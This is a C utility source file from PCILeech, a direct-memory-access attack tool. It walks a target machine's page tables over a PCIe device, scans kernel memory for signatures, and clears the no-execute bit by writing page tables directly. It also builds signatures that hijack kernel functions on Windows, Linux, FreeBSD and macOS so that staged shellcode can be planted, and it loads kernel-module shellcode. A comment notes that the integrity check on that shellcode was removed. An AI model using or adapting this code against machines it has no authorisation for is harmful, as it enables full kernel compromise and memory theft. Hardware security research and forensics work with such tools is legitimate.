// util.c : implementation of various utility functions.
//
// (c) Ulf Frisk, 2016, 2017
// Author: Ulf Frisk, pcileech@frizk.net
//
#include "pcileech.h"
#include "util.h"
#include "device.h"
#include "shellcode.h"

#define PT_VALID_MASK		0x00000000000000BD	// valid, active, supervior paging structure
#define PT_VALID_VALUE		0x0000000000000021	// 
#define PT_MASK_ENABLE		0x0000000000000001
#define PT_MASK_PS			0x0000000000000080
#define PT_MASK_NX			0x8000000000000000
#define PT_FLAG_HELPER_X	0x0000000000000001

BOOL Util_PageTable_Helper(_Inout_ PPCILEECH_CONTEXT ctx, _In_ QWORD qwVA, _In_ QWORD qwPgLvl, _In_ QWORD qwPgTblPA, _In_ QWORD qwTestMask, _In_ QWORD qwTestValue, _In_ QWORD fMode, _Out_ PQWORD pqwPTE, _Out_opt_ PQWORD pqwPTEPA, _Out_ PQWORD pqwPgLvl)
{
	BOOL result;
	BYTE pb[4096];
	QWORD idx, pte;
	result = DeviceReadMEM(ctx, qwPgTblPA, pb, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL);
	if(!result) { return FALSE; }
	idx = 0xff8 & ((qwVA >> (qwPgLvl * 9 + 3)) << 3);
	pte = *(PQWORD)(pb + idx);
	if(!(pte & PT_MASK_ENABLE)) { return FALSE; }
	if((pte & qwTestMask) != qwTestValue) { return FALSE; }
	if((fMode & PT_FLAG_HELPER_X) && (pte & PT_MASK_NX)) {
		*(PQWORD)(pb + idx) &= 0x7fffffffffffffff;
		DeviceWriteMEM(ctx, qwPgTblPA + idx, pb + idx, 8, 0);
	}
	if((qwPgLvl == 1) || (pte & PT_MASK_PS)) {
		*pqwPgLvl = qwPgLvl;
		*pqwPTE = pte;
		*pqwPTEPA = qwPgTblPA + idx;
		return TRUE;
	}
	qwPgTblPA = pte & 0x0000fffffffff000;
	if(!qwPgTblPA) { return FALSE; }
	return Util_PageTable_Helper(ctx, qwVA, qwPgLvl - 1, qwPgTblPA, qwTestMask, qwTestValue, fMode, pqwPTE, pqwPTEPA, pqwPgLvl);
}

BOOL Util_PageTable_ReadPTE(_Inout_ PPCILEECH_CONTEXT ctx, _In_ QWORD qwCR3, _In_ QWORD qwAddressLinear, _Out_ PQWORD pqwPTE, _Out_ PQWORD pqPTEAddrPhys)
{
	QWORD ptePgLvl;
	return Util_PageTable_Helper(ctx, qwAddressLinear, 4, qwCR3, PT_VALID_MASK, PT_VALID_VALUE, 0, pqwPTE, pqPTEAddrPhys, &ptePgLvl);
}

BOOL Util_PageTable_SetMode(_Inout_ PPCILEECH_CONTEXT ctx, _In_ QWORD qwCR3, _In_ QWORD qwAddressLinear, _In_ BOOL fSetX)
{
	QWORD pte, pteVA, ptePgLvl;
	return Util_PageTable_Helper(ctx, qwAddressLinear, 4, qwCR3, 0, 0, PT_FLAG_HELPER_X, &pte, &pteVA, &ptePgLvl);
}

BOOL Util_PageTable_FindSignatureBase_IsPageTableDataValid(_In_ QWORD qwPageTableData)
{
	if((qwPageTableData & PT_VALID_MASK) != PT_VALID_VALUE) {
		return FALSE; // Not valid supervisor page entry
	}
	qwPageTableData &= 0x0000fffffffff000;
	if(qwPageTableData == 0) {
		return FALSE; // Not found
	}
	if(qwPageTableData > 0xffffffff) {
		return FALSE; // Outside 32-bit scope
	}
	if(qwPageTableData > 0xc0000000) {
		return FALSE; // Possibly in PCIE space
	}
	return TRUE;
}

BOOL Util_PageTable_FindSignatureBase_CachedReadMEM(_Inout_ PPCILEECH_CONTEXT ctx, _In_ QWORD qwAddr, _Out_ PBYTE pbPage, _Inout_updates_bytes_(0x01000000) PBYTE pbCache)
{
	BOOL result;
	if(pbCache) {
		if(*(PQWORD)pbCache == 0) {
			*(PQWORD)pbCache = 2;
			result = DeviceReadMEM(ctx, 0x00100000, pbCache + 0x00100000, 0x00F00000, PCILEECH_MEM_FLAG_RETRYONFAIL);
			if(!result) { return FALSE; }
			*(PQWORD)pbCache = 1;
		}
		if(*(PQWORD)pbCache == 1 && qwAddr >= 0x00100000 && qwAddr < 0x01000000) {
			memcpy(pbPage, pbCache + qwAddr, 4096);
			return TRUE;
		}
	}
	return DeviceReadMEM(ctx, qwAddr, pbPage, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL);
}

BOOL Util_PageTable_FindSignatureBase_Search(_Inout_ PPCILEECH_CONTEXT ctx, _Inout_ PBYTE pbCache, _In_ QWORD qwCR3, _In_ PSIGNATUREPTE pPTEs, _In_ QWORD cPTEs, _Out_ PQWORD pqwSignatureBase)
{
	// win8  kernel modules start at even  1-page boundaries (0x1000)
	// win10 kernel modules start at even 16-page boundaries (0x10000)
	// winx64 kernel memory is located above 0xfffff80000000000
	BOOL result;
	QWORD PML4[512], PDPT[512], PD[512], PT[512];
	QWORD PML4_idx = 0xfff, PDPT_idx = 0xfff, PD_idx = 0xfff;
	PSIGNATUREPTE pPTE = pPTEs;
	QWORD cPTE = 0, cPTEPages = 0, PTE, qwA;
	QWORD qwPageTableData;
	WORD wSignature;
	result = Util_PageTable_FindSignatureBase_CachedReadMEM(ctx, qwCR3 & 0x0000fffffffff000, (PBYTE)PML4, pbCache);
	if(!result) { return FALSE; }
	qwA = 0x0fffff80000000000;
	while(qwA > 0x07fffffffffffffff) {
		if(PML4_idx != (0x1ff & (qwA >> 39))) { // PML4
			PML4_idx = 0x1ff & (qwA >> 39);
			qwPageTableData = PML4[PML4_idx];
			if(!Util_PageTable_FindSignatureBase_IsPageTableDataValid(qwPageTableData)) {
				qwA += 0x0000008000000000;
				qwA &= 0xffffff8000000000;
				continue;
			}
			result = Util_PageTable_FindSignatureBase_CachedReadMEM(ctx, qwPageTableData & 0x0000fffffffff000, (PBYTE)PDPT, pbCache);
			if(!result) {
				qwA += 0x0000008000000000;
				qwA &= 0xffffff8000000000;
				continue;
			}
			PDPT_idx = 0xfff;
			PD_idx = 0xfff;
		}
		if(PDPT_idx != (0x1ff & (qwA >> 30))) { // PDPT(Page-Directory Pointer Table)
			PDPT_idx = 0x1ff & (qwA >> 30);
			qwPageTableData = PDPT[PDPT_idx];
			if(!Util_PageTable_FindSignatureBase_IsPageTableDataValid(qwPageTableData)) {
				qwA += 0x0000000040000000;
				qwA &= 0xffffffffC0000000;
				continue;
			}
			result = Util_PageTable_FindSignatureBase_CachedReadMEM(ctx, qwPageTableData & 0x0000fffffffff000, (PBYTE)PD, pbCache);
			if(!result) {
				qwA += 0x0000000040000000;
				qwA &= 0xffffffffC0000000;
				continue;
			}
			PD_idx = 0xfff;
		}
		if(PD_idx != (0x1ff & (qwA >> 21))) { // PD (Page Directory)
			PD_idx = 0x1ff & (qwA >> 21);
			qwPageTableData = PD[PD_idx];
			if(!Util_PageTable_FindSignatureBase_IsPageTableDataValid(qwPageTableData)) {
				qwA += 0x0000000000200000;
				qwA &= 0xffffffffffE00000;
				continue;
			}
			result = Util_PageTable_FindSignatureBase_CachedReadMEM(ctx, qwPageTableData & 0x0000fffffffff000, (PBYTE)PT, pbCache);
			if(!result) {
				qwA += 0x0000000000200000;
				qwA &= 0xffffffffffE00000;
				continue;
			}
		}
		PTE = PT[0x1ff & (qwA >> 12)];
		wSignature = (PTE & 0x07) | ((PTE >> 48) & 0x8000);
		if(wSignature != pPTE->wSignature) { // signature do not match
			qwA += 0x0000000000001000;
			qwA &= 0xfffffffffffff000;
			pPTE = pPTEs;
			cPTE = 0;
			cPTEPages = 0;
			continue;
		}
		if(cPTE == 0 && cPTEPages == 0) {
			*pqwSignatureBase = qwA;
		}
		cPTEPages++;
		if(cPTEPages == pPTE->cPages) { // next page section
			cPTE++;
			pPTE = pPTEs + cPTE;
			cPTEPages = 0;
			if(pPTE->cPages == 0 || cPTE == cPTEs) { // found
				return TRUE;
			}
		}
		qwA += 0x1000;
	}
	*pqwSignatureBase = 0;
	return FALSE;
}

BOOL Util_PageTable_WindowsHintPML4(_Inout_ PPCILEECH_CONTEXT ctx, _Out_ PQWORD pqwCR3)
{
	BYTE pb[0x1000];
	return
		DeviceReadMEM(ctx, 0x1000, pb, 0x1000, 0) &&
		((*(PQWORD)(pb + 0x78) & 0xfffffffffff00fff) == 0xffffffffffd00000) &&
		((*(PQWORD)(pb + 0xa0) & 0xffffffff00000fff) == 0) &&
		(*pqwCR3 = *(PQWORD)(pb + 0xa0));
	return FALSE;
}

BOOL Util_PageTable_FindSignatureBase(_Inout_ PPCILEECH_CONTEXT ctx, _Inout_ PQWORD pqwCR3, _In_ PSIGNATUREPTE pPTEs, _In_ QWORD cPTEs, _Out_ PQWORD pqwSignatureBase)
{
	BOOL result;
	QWORD qwRegCR3;
	PBYTE pbCache;
	// if page base (CR3) is specified -> use it.
	if(!ctx->cfg->fPageTableScan) {
		return Util_PageTable_FindSignatureBase_Search(ctx, NULL, *pqwCR3, pPTEs, cPTEs, pqwSignatureBase);
	}
	// try CR3/PML4 hint at PA 0x1000 on windows 8.1/10.
	result = 
		Util_PageTable_WindowsHintPML4(ctx, pqwCR3) && 
		Util_PageTable_FindSignatureBase_Search(ctx, NULL, *pqwCR3, pPTEs, cPTEs, pqwSignatureBase);
	if(result) { return TRUE; }
	// page table scan guessing common CR3 base addresses.
	pbCache = LocalAlloc(LMEM_ZEROINIT, 0x01000000);
	for(qwRegCR3 = 0x100000; qwRegCR3 < 0x1000000; qwRegCR3 += 0x1000) {
		if(Util_PageTable_FindSignatureBase_Search(ctx, pbCache, qwRegCR3, pPTEs, cPTEs, pqwSignatureBase)) {
			*pqwCR3 = qwRegCR3;
			LocalFree(pbCache);
			return TRUE;
		}
	}
	LocalFree(pbCache);
	return FALSE;
}

BOOL Util_PageTable_FindMappedAddress(_Inout_ PPCILEECH_CONTEXT ctx, _In_ QWORD qwCR3, _In_ QWORD qwAddrPhys, _Out_ PQWORD pqwAddrVirt, _Out_opt_ PQWORD pqwPTE, _Out_opt_ PQWORD pqwPDE, _Out_opt_ PQWORD pqwPDPTE, _Out_opt_ PQWORD pqwPML4E)
{
	BOOL result, fFirstRun;
	QWORD PML4[512], PDPT[512], PD[512], PT[512];
	QWORD PML4_idx = 0xfff, PDPT_idx = 0xfff, PD_idx = 0xfff, PT_idx = 0xfff;
	QWORD qwA;
	QWORD qwPageTableData;
	result = DeviceReadMEM(ctx, qwCR3 & 0x0000fffffffff000, (PBYTE)PML4, 0x1000, PCILEECH_MEM_FLAG_RETRYONFAIL);
	if(!result) { return FALSE; }
	qwA = 0;
	fFirstRun = TRUE;
	while(qwA || fFirstRun) {
		fFirstRun = FALSE;
		if(qwA & 0xffff800000000000) {
			qwA |= 0xffff800000000000;
		}
		if(PML4_idx != (0x1ff & (qwA >> 39))) { // PML4
			PML4_idx = 0x1ff & (qwA >> 39);
			qwPageTableData = PML4[PML4_idx];
			if((qwPageTableData & 0x81) != 0x01) {
				qwA = (qwA + 0x0000008000000000) & 0xffffff8000000000;
				continue;
			}
			result = DeviceReadMEM(ctx, qwPageTableData & 0x0000fffffffff000, (PBYTE)PDPT, 0x1000, 0);
			if(!result) {
				qwA = (qwA + 0x0000008000000000) & 0xffffff8000000000;
				continue;
			}
			PDPT_idx = 0xfff;
			PD_idx = 0xfff;
			PT_idx = 0xfff;
		}
		if(PDPT_idx != (0x1ff & (qwA >> 30))) { // PDPT(Page-Directory Pointer Table)
			PDPT_idx = 0x1ff & (qwA >> 30);
			qwPageTableData = PDPT[PDPT_idx];
			if((qwPageTableData & 0x81) != 0x01) {
				qwA = (qwA + 0x0000000040000000) & 0xffffffffC0000000;
				continue;
			}
			result = DeviceReadMEM(ctx, qwPageTableData & 0x0000fffffffff000, (PBYTE)PD, 0x1000, 0);
			if(!result) {
				qwA = (qwA + 0x0000000040000000) & 0xffffffffC0000000;
				continue;
			}
			PD_idx = 0xfff;
			PT_idx = 0xfff;
		}
		if(PD_idx != (0x1ff & (qwA >> 21))) { // PD (Page Directory)
			PD_idx = 0x1ff & (qwA >> 21);
			qwPageTableData = PD[PD_idx];
			if(((qwPageTableData & 0x81) == 0x81) && ((qwPageTableData & 0x0000ffffffe00000) == (qwAddrPhys & 0x0000ffffffe00000))) { // map 2MB page
				*pqwAddrVirt = qwA + (qwAddrPhys & 0x1fffff);
				if(pqwPTE) { *pqwPTE = PD[PD_idx]; }
				if(pqwPDE) { *pqwPDE = PD[PD_idx]; }
				if(pqwPDPTE) { *pqwPDPTE = PDPT[PDPT_idx]; }
				if(pqwPML4E) { *pqwPML4E = PML4[PML4_idx]; }
				return TRUE;
			}
			if((qwPageTableData & 0x81) != 0x01) {
				qwA = (qwA + 0x0000000000200000) & 0xffffffffffE00000;
				continue;
			}
			result = DeviceReadMEM(ctx, qwPageTableData & 0x0000fffffffff000, (PBYTE)PT, 0x1000, 0);
			if(!result) {
				qwA = (qwA + 0x0000000000200000) & 0xffffffffffE00000;
				continue;
			}
			PT_idx = 0xfff;
		}
		if(PT_idx != (0x1ff & (qwA >> 12))) { // PT (Page Table)
			PT_idx = 0x1ff & (qwA >> 12);
			qwPageTableData = PT[PT_idx];
			if(((qwPageTableData & 0x01) == 0x01) && ((qwPageTableData & 0x0000fffffffff000) == (qwAddrPhys & 0x0000fffffffff000))) {
				*pqwAddrVirt = qwA + (qwAddrPhys & 0xfff);
				if(pqwPTE) { *pqwPTE = PT[PT_idx]; }
				if(pqwPDE) { *pqwPDE = PD[PD_idx]; }
				if(pqwPDPTE) { *pqwPDPTE = PDPT[PDPT_idx]; }
				if(pqwPML4E) { *pqwPML4E = PML4[PML4_idx]; }
				return TRUE;
			}
			qwA = (qwA + 0x0000000000001000) & 0xfffffffffffff000;
			continue;
		}
	}
	return FALSE;
}

BOOL Util_HexAsciiToBinary(_In_ LPSTR sz, _Out_ PBYTE pb, _In_ DWORD cb, _Out_ PDWORD pcb)
{
	SIZE_T i, csz = strlen(sz);
	*pcb = (DWORD)(csz >> 1);
	if((csz % 2) || (cb < *pcb)) { return FALSE; }
	for(i = 0; i < *pcb; i++) {
		if(!sscanf_s(sz + (i << 1), "%02x", (PDWORD)(pb + i))) { return FALSE; }
	}
	return TRUE;
}

BOOL Util_ParseHexFileBuiltin(_In_ LPSTR sz, _Out_ PBYTE pb, _In_ DWORD cb, _Out_ PDWORD pcb)
{
	SIZE_T i;
	FILE *pFile;
	BOOL result;
	// 1: try load default
	if(0 == memcmp("DEFAULT", sz, 7)) {
		for(i = 0; i < (sizeof(SHELLCODE_DEFAULT) / sizeof(SHELLCODE_DEFAULT_STRUCT)); i++) {
			if((0 == strcmp(SHELLCODE_DEFAULT[i].sz, sz)) && (SHELLCODE_DEFAULT[i].cb <= cb)) {					
				memcpy(pb, SHELLCODE_DEFAULT[i].pb, SHELLCODE_DEFAULT[i].cb);
				*pcb = SHELLCODE_DEFAULT[i].cb;
				return TRUE;
			}
		}
		return FALSE;
	}
	// 2: try load hex ascii
	if(Util_HexAsciiToBinary(sz, pb, cb, pcb)) {
		return TRUE;
	}
	// 3: try load file
	i = strnlen_s(sz, MAX_PATH);
	if(i > 4 && i < MAX_PATH) { // try to load from file
		if(fopen_s(&pFile, sz, "rb") || !pFile) { return FALSE; }
		*pcb = (DWORD)fread(pb, 1, cb, pFile);
		result = (0 != feof(pFile));
		fclose(pFile);
		return result;
	}
	return FALSE;
}

BOOL Util_ParseSignatureLine(_In_ PSTR szLine, _In_ DWORD cSignatureChunks, _Out_ PSIGNATURE_CHUNK pSignatureChunks) {
	LPSTR szToken, szContext = NULL;
	PSIGNATURE_CHUNK pChunk;
	SIZE_T i;
	BOOL result;
	if(!szLine || !strlen(szLine) || szLine[0] == '#') { return FALSE; }
	for(i = 0; i < cSignatureChunks * 2; i++) {
		pChunk = &pSignatureChunks[i / 2];
		szToken = strtok_s(szLine, ",:;", &szContext);
		szLine = NULL;
		if(!szToken) { return FALSE; }
		if(i % 2 == 0) {
			if(szToken[0] == '*') {
				pChunk->tpOffset = SIGNATURE_CHUNK_TP_OFFSET_ANY;
			} else {
				if(szToken[0] == 'r') {
					pChunk->tpOffset = SIGNATURE_CHUNK_TP_OFFSET_RELATIVE;
					szToken = &szToken[1];
				}
				pChunk->cbOffset = strtoul(szToken, NULL, 16);
			}
		} else {
			result = Util_ParseHexFileBuiltin(szToken, pChunk->pb, sizeof(pChunk->pb), &pChunk->cb);
			if(!result) { return FALSE; }
		}
	}
	return TRUE;
}

BOOL Util_LoadSignatures(_In_ LPSTR szSignatureName, _In_ LPSTR szFileExtension, _Out_ PSIGNATURE pSignatures, _In_ PDWORD cSignatures, _In_ DWORD cSignatureChunks)
{
	BYTE pbFile[0x10000];
	DWORD cbFile = 0, cSignatureIdx = 0;
	CHAR szSignatureFile[MAX_PATH];
	FILE *pFile;
	LPSTR szContext = NULL, szLine;
	memset(pSignatures, 0, *cSignatures * sizeof(SIGNATURE));
	// open and read file
	Util_GetFileInDirectory(szSignatureFile, szSignatureName);
	if(_strnicmp(szSignatureFile + strlen(szSignatureFile) - strlen(szFileExtension), szFileExtension, MAX_PATH)) { // add extension if missing
		strcpy_s(szSignatureFile + strlen(szSignatureFile), MAX_PATH - strlen(szSignatureFile), szFileExtension);
	}
	if(fopen_s(&pFile, szSignatureFile, "rb") || !pFile) { return FALSE; }
	memset(pbFile, 0, 0x10000);
	cbFile = (DWORD)fread(pbFile, 1, 0x10000, pFile);
	fclose(pFile);
	if(!cbFile || cbFile == 0x10000) { return FALSE; }
	// parse file
	szLine = strtok_s(pbFile, "\r\n", &szContext);
	while(szLine && cSignatureIdx < *cSignatures) {
		if(Util_ParseSignatureLine(szLine, cSignatureChunks, pSignatures[cSignatureIdx].chunk)) {
			cSignatureIdx++;
		}
		szLine = strtok_s(NULL, "\r\n", &szContext);
	}
	*cSignatures = cSignatureIdx;
	return (cSignatureIdx > 0);
}

VOID Util_GetFileInDirectory(_Out_ CHAR szPath[MAX_PATH], _In_ LPSTR szFileName)
{
	SIZE_T i, cchFileName = strlen(szFileName);
	GetModuleFileNameA(NULL, (LPSTR)szPath, (DWORD)(MAX_PATH - cchFileName - 4));
	for(i = strlen(szPath) - 1; i > 0; i--) {
		if(szPath[i] == '/' || szPath[i] == '\\') {
			strcpy_s(&szPath[i + 1], MAX_PATH - i - 5, szFileName);
			return;
		}
	}
}

DWORD Util_memcmpEx(_In_ PBYTE pb1, _In_ PBYTE pb2, _In_  DWORD cb)
{
	DWORD i;
	for(i = 0; i < cb; i++) {
		if(pb1[i] != pb2[i]) {
			return i + 1;
		}
	}
	return 0;
}

VOID Util_GenRandom(_Out_ PBYTE pb, _In_ DWORD cb)
{
	DWORD i = 0;
	srand((unsigned int)GetTickCount64()); 
	if(cb % 2) {
		*(PBYTE)(pb) = (BYTE)rand();
		i++;
	}
	for(;i <= cb - 2; i += 2) {
		*(PWORD)(pb + i) = (WORD)rand();
	}
}

#define KMD_EXEC_MAX_SHELLCODE_SIZE		0x80000

BOOL Util_LoadKmdExecShellcode(_In_ LPSTR szKmdExecName, _Out_ PKMDEXEC* ppKmdExec)
{
	CHAR szKmdExecFile[MAX_PATH];
	PBYTE pbKmdExec;
	DWORD cbKmdExec = 0, i;
	PKMDEXEC pKmdExec;
	FILE *pFile;
	pbKmdExec = (PBYTE)LocalAlloc(LMEM_ZEROINIT, KMD_EXEC_MAX_SHELLCODE_SIZE);
	if(!pbKmdExec) { return FALSE; }
	// open and read file
	if(0 == memcmp("DEFAULT", szKmdExecName, 7)) {
		for(i = 0; i < (sizeof(SHELLCODE_DEFAULT) / sizeof(SHELLCODE_DEFAULT_STRUCT)); i++) {
			if((0 == strcmp(SHELLCODE_DEFAULT[i].sz, szKmdExecName)) && (SHELLCODE_DEFAULT[i].cb <= KMD_EXEC_MAX_SHELLCODE_SIZE)) {
				memcpy(pbKmdExec, SHELLCODE_DEFAULT[i].pb, SHELLCODE_DEFAULT[i].cb);
				cbKmdExec = SHELLCODE_DEFAULT[i].cb;
				break;
			}
		}
	}
	if(0 == cbKmdExec) {
		Util_GetFileInDirectory(szKmdExecFile, szKmdExecName);
		strcpy_s(szKmdExecFile + strlen(szKmdExecFile), MAX_PATH - strlen(szKmdExecFile), ".ksh");
		if(fopen_s(&pFile, szKmdExecFile, "rb") || !pFile) { return FALSE; }
		cbKmdExec = (DWORD)fread(pbKmdExec, 1, KMD_EXEC_MAX_SHELLCODE_SIZE, pFile);
		fclose(pFile);
		if(cbKmdExec < sizeof(KMDEXEC)) { goto error; }
	}
	// ensure file validity
	pKmdExec = (PKMDEXEC)pbKmdExec;
	if(pKmdExec->dwMagic != KMDEXEC_MAGIC) { goto error; }
	// INFO: TODO: SHA256 integrity validation temporarily removed due to linux port.
	// parse file
	pKmdExec->cbShellcode = (pKmdExec->cbShellcode + 0xfff) & 0xfffff000; // align to 4k (otherwise dma write may fail)
	pKmdExec->szOutFormatPrintf = (LPSTR)((QWORD)pKmdExec + (QWORD)pKmdExec->szOutFormatPrintf);
	pKmdExec->pbShellcode = (PBYTE)((QWORD)pKmdExec + (QWORD)pKmdExec->pbShellcode);
	*ppKmdExec = pKmdExec;
	return TRUE;
error:
	LocalFree(pbKmdExec);
	pKmdExec = NULL;
	return FALSE;
}

QWORD Util_GetNumeric(_In_ LPSTR sz)
{
	if((strlen(sz) > 1) && (sz[0] == '0') && ((sz[1] == 'x') || (sz[1] == 'X'))) {
		return strtoull(sz, NULL, 16); // Hex (starts with 0x)
	} else {
		return strtoull(sz, NULL, 10); // Not Hex -> try Decimal
	}
}

VOID Util_CreateSignatureLinuxGeneric(_In_ QWORD paBase, 
	_In_ DWORD paSzKallsyms, _In_ QWORD vaSzKallsyms, _In_ QWORD vaFnKallsyms, 
	_In_ DWORD paSzFnHijack, _In_ QWORD vaSzFnHijack, _In_ QWORD vaFnHijack, _Out_ PSIGNATURE pSignature)
{
	DWORD dwBaseKallsyms2M = (paSzKallsyms & ~0x1fffff) - ((vaSzKallsyms & ~0x1fffff) - (vaFnKallsyms & ~0x1fffff));	// symbol name base is not same as fn base
	DWORD dwBaseFnHijack2M = (paSzFnHijack & ~0x1fffff) - ((vaSzFnHijack & ~0x1fffff) - (vaFnHijack & ~0x1fffff));		// symbol name base is not same as fn base
	memset(pSignature, 0, sizeof(SIGNATURE));
	Util_ParseHexFileBuiltin("DEFAULT_LINUX_X64_STAGE1", pSignature->chunk[2].pb, 4096, &pSignature->chunk[2].cb);
	Util_ParseHexFileBuiltin("DEFAULT_LINUX_X64_STAGE2", pSignature->chunk[3].pb, 4096, &pSignature->chunk[3].cb);
	Util_ParseHexFileBuiltin("DEFAULT_LINUX_X64_STAGE3", pSignature->chunk[4].pb, 4096, &pSignature->chunk[4].cb);
	pSignature->chunk[2].cbOffset = (DWORD)(dwBaseFnHijack2M + (vaFnHijack & 0x1fffff));
	pSignature->chunk[3].cbOffset = 0xd00;
	pSignature->chunk[4].cbOffset = (DWORD)(dwBaseKallsyms2M + (vaFnKallsyms & 0x1fffff));
	pSignature->chunk[0].qwAddress = paBase + dwBaseFnHijack2M + (vaFnHijack & 0x1ff000);
	pSignature->chunk[1].qwAddress = paBase;
}

VOID Util_CreateSignatureFreeBSDGeneric(_In_ DWORD paStrTab, _In_ DWORD paFnHijack, _Out_ PSIGNATURE pSignature)
{
	memset(pSignature, 0, sizeof(SIGNATURE));
	Util_ParseHexFileBuiltin("DEFAULT_FREEBSD_X64_STAGE1", pSignature->chunk[2].pb, 4096, &pSignature->chunk[2].cb);
	Util_ParseHexFileBuiltin("DEFAULT_FREEBSD_X64_STAGE2", pSignature->chunk[3].pb, 4096, &pSignature->chunk[3].cb);
	Util_ParseHexFileBuiltin("DEFAULT_FREEBSD_X64_STAGE3", pSignature->chunk[4].pb, 4096, &pSignature->chunk[4].cb);
	pSignature->chunk[0].cbOffset = paFnHijack;
	pSignature->chunk[1].cbOffset = 0x1e00;
	pSignature->chunk[2].cbOffset = paFnHijack;
	pSignature->chunk[3].cbOffset = 0x1e00;
	pSignature->chunk[4].cbOffset = paStrTab;
	pSignature->chunk[0].qwAddress = pSignature->chunk[0].cbOffset & ~0xfff;
	pSignature->chunk[1].qwAddress = pSignature->chunk[1].cbOffset & ~0xfff;
}

VOID Util_CreateSignatureMacOSGeneric(_In_ DWORD paKernelBase, _In_ DWORD paFunctionHook, _In_ DWORD paStage2, _Out_ PSIGNATURE pSignature)
{
	memset(pSignature, 0, sizeof(SIGNATURE));
	Util_ParseHexFileBuiltin("DEFAULT_MACOS_STAGE1", pSignature->chunk[2].pb, 4096, &pSignature->chunk[2].cb);
	Util_ParseHexFileBuiltin("DEFAULT_MACOS_STAGE2", pSignature->chunk[3].pb, 4096, &pSignature->chunk[3].cb);
	Util_ParseHexFileBuiltin("DEFAULT_MACOS_STAGE3", pSignature->chunk[4].pb, 4096, &pSignature->chunk[4].cb);
	pSignature->chunk[0].cbOffset = paFunctionHook;
	pSignature->chunk[1].cbOffset = paStage2;
	pSignature->chunk[2].cbOffset = paFunctionHook;
	pSignature->chunk[3].cbOffset = paStage2;
	pSignature->chunk[4].cbOffset = paKernelBase;
	pSignature->chunk[0].qwAddress = pSignature->chunk[0].cbOffset & ~0xfff;
	pSignature->chunk[1].qwAddress = pSignature->chunk[1].cbOffset & ~0xfff;
}

VOID Util_CreateSignatureWindowsHalGeneric(_Out_ PSIGNATURE pSignature)
{
	memset(pSignature, 0, sizeof(SIGNATURE));
	Util_ParseHexFileBuiltin("DEFAULT_WINX64_STAGE2_HAL", pSignature->chunk[3].pb, 4096, &pSignature->chunk[3].cb);
	Util_ParseHexFileBuiltin("DEFAULT_WINX64_STAGE3", pSignature->chunk[4].pb, 4096, &pSignature->chunk[4].cb);
}

VOID Util_CreateSignatureLinuxEfiRuntimeServices(_Out_ PSIGNATURE pSignature)
{
	memset(pSignature, 0, sizeof(SIGNATURE));
	Util_ParseHexFileBuiltin("DEFAULT_LINUX_X64_STAGE2_EFI", pSignature->chunk[3].pb, 4096, &pSignature->chunk[3].cb);
	Util_ParseHexFileBuiltin("DEFAULT_LINUX_X64_STAGE3", pSignature->chunk[4].pb, 4096, &pSignature->chunk[4].cb);
}

VOID Util_CreateSignatureSearchAll(_In_ PBYTE pb, _In_ DWORD cb, _Out_ PSIGNATURE pSignature)
{
	memset(pSignature, 0, sizeof(SIGNATURE));
	pSignature->chunk[0].tpOffset = SIGNATURE_CHUNK_TP_OFFSET_ANY;
	pSignature->chunk[0].cb = cb < 0x1000 ? cb : 0x1000;
	pSignature->chunk[2].tpOffset = SIGNATURE_CHUNK_TP_OFFSET_RELATIVE;
	memcpy(pSignature->chunk[0].pb, pb, pSignature->chunk[0].cb);
}

VOID Util_Read1M(_Inout_ PPCILEECH_CONTEXT ctx, _Out_ PBYTE pbBuffer1M, _In_ QWORD qwBaseAddress, _Inout_opt_ PPAGE_STATISTICS pPageStat)
{
	QWORD o, p;
	// try read 1M in 128k chunks
	for(o = 0; o < 0x00100000; o += 0x00020000) {
		if((qwBaseAddress + o + 0x00020000 <= ctx->cfg->qwAddrMax) && DeviceReadMEM(ctx, qwBaseAddress + o, pbBuffer1M + o, 0x00020000, 0)) {
			PageStatUpdate(pPageStat, qwBaseAddress + o + 0x00020000, 32, 0);
		} else {
			// try read 128k in 4k (page) chunks
			for(p = 0; p < 0x00020000; p += 0x1000) {
				if(!(qwBaseAddress + o + p + 0x1000 <= ctx->cfg->qwAddrMax)) {
					return;
				}
				if(DeviceReadMEM(ctx, qwBaseAddress + o + p, pbBuffer1M + o + p, 0x1000, 0)) {
					PageStatUpdate(pPageStat, qwBaseAddress + o + p + 0x1000, 1, 0);
				} else {
					PageStatUpdate(pPageStat, qwBaseAddress + o + p + 0x1000, 0, 1);
				}
			}
		}
	}
}

BOOL Util_Read16M(_Inout_ PPCILEECH_CONTEXT ctx, _Out_ PBYTE pbBuffer16M, _In_ QWORD qwBaseAddress, _Inout_opt_ PPAGE_STATISTICS pPageStat)
{
	BOOL isSuccess[4] = { FALSE, FALSE, FALSE, FALSE };
	QWORD i, o, qwOffset;
	// try read 16M
	if((qwBaseAddress + 0x01000000 <= ctx->cfg->qwAddrMax) && DeviceReadMEM(ctx, qwBaseAddress, pbBuffer16M, 0x01000000, 0)) {
		PageStatUpdate(pPageStat, qwBaseAddress + 0x010000000, 4096, 0);
		return TRUE;
	}
	// try read 16M in 4M chunks
	memset(pbBuffer16M, 0, 0x01000000);
	for(i = 0; i < 4; i++) {
		o = 0x00400000 * i;
		isSuccess[i] = (qwBaseAddress + o + 0x00400000 <= ctx->cfg->qwAddrMax) && DeviceReadMEM(ctx, qwBaseAddress + o, pbBuffer16M + o, 0x00400000, 0);
	}
	// DMA mode + all memory inside scope + and all 4M reads fail + no force flag + iosize >= 1MB => fail
	if(!ctx->cfg->fForceRW && !ctx->phKMD && (ctx->cfg->qwMaxSizeDmaIo >= 0x01000000) && qwBaseAddress + 0x01000000 <= ctx->cfg->qwAddrMax && !isSuccess[0] && !isSuccess[1] && !isSuccess[2] && !isSuccess[3]) {
		PageStatUpdate(pPageStat, qwBaseAddress + 0x010000000, 0, 4096);
		return FALSE;
	}
	// try read failed 4M chunks in 1M chunks
	for(i = 0; i < 4; i++) {
		if(isSuccess[i]) {
			PageStatUpdate(pPageStat, qwBaseAddress + (i + 1) * 0x00400000, 1024, 0);
		} else {
			qwOffset = 0x00400000 * i;
			for(o = 0; o < 0x00400000; o += 0x00100000) {
				Util_Read1M(ctx, pbBuffer16M + qwOffset + o, qwBaseAddress + qwOffset + o, pPageStat);
			}
		}
	}
	return TRUE;
}

VOID Util_WaitForPowerOn(_Inout_ PPCILEECH_CONTEXT ctx)
{
	BYTE pbDummy[4096];
	while(TRUE) {
		if(DeviceOpen(ctx)) {
			if(DeviceReadDMA(ctx, 0x01000000, pbDummy, 0x1000, PCILEECH_MEM_FLAG_RETRYONFAIL)) {
				break;
			}
			DeviceClose(ctx);
		}
		Sleep(100);
	}
}

